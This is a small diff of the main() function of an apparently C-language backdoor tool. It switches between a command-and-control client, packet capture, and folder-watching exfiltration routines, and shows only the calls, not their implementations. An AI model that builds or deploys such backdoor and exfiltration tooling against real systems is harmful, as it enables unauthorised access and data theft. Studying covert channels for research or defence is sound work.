@@ -96,15 +96,15 @@ int main(int argc, char *argv[])
 	if (client) // C&C Client
 	{
 		// Start command entry
-		//backdoor_client(ipaddr, port, duplex);
+		backdoor_client(ipaddr, port, duplex);
 		// Start exfil listener
-		exfil_listen(ipaddr);
+		//exfil_listen(ipaddr);
 	}
 	else // Backdoor Server
 	{
-		exfil_watch(ipaddr, folder);
+		//exfil_watch(ipaddr, folder);
 
-		//pcap_start(filter, duplex);
+		pcap_start(filter, duplex);
 	}
 	
 	return 0;
